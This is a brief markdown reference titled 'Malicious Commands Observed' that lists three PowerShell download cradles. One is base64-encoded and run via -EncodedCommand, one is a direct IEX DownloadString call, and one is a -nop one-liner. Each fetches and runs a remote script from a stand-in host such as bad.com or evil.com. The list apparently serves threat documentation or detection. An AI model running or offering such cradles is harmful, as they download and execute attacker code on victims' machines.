# Malicious Commands Observed

## Encoded PowerShell Execution

```powershell id="d4u8qa"
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://bad.com/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

---

## Direct Download Cradle

```powershell id="n8u1jk"
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```

---

## Obfuscated PowerShell Execution

```powershell id="d8f6mx"
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
```

